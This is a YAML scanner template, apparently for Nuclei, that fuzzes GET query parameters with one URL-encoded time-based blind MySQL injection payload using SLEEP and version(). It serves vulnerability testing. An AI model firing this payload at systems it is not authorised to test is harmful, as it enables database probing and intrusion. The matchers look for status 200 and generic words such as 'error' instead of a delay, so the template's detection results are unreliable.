id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL Injection vulnerabilities using a specified payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200         # Assuming successful response means vulnerability is present
      - type: word
        part: body
        words:
          - "error"     # Look for SQL error messages in the response to confirm injection
          - "mysql"     # Specific term related to MySQL errors (can be adjusted based on DB)
          - "SQL"       # General SQL error messages
          - "syntax"    # A common SQL error response term